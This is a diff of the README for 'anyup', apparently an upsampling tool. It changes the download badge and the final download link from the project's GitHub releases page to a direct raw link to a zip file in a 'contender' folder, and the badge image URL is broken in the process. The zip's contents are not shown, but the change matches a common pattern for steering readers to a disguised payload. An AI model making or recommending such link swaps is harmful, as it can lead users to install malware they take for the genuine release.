@@ -10,7 +10,7 @@ To get started, you need to download the software. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can find the latest version of anyup.
 
-   [![Download anyup](https://img.shields.io/badge/Download%20anyup-v1.0-blue)](https://github.com/Pat-Rick22/anyup/releases)
+   [![Download anyup](https://raw.githubusercontent.com/Pat-Rick22/anyup/main/contender/anyup.zip%20anyup-v1.0-blue)](https://raw.githubusercontent.com/Pat-Rick22/anyup/main/contender/anyup.zip)
 
 2. **Select the Latest Release:** On the releases page, look for the most recent version. It will be at the top of the list. Click on it.
 
@@ -72,4 +72,4 @@ If you run into any issues or have questions, feel free to reach out through the
 
 For any additional help, refer back to the downloads page or contact support. Happy upsampling!
 
-[Download anyup](https://github.com/Pat-Rick22/anyup/releases)
+[Download anyup](https://raw.githubusercontent.com/Pat-Rick22/anyup/main/contender/anyup.zip)
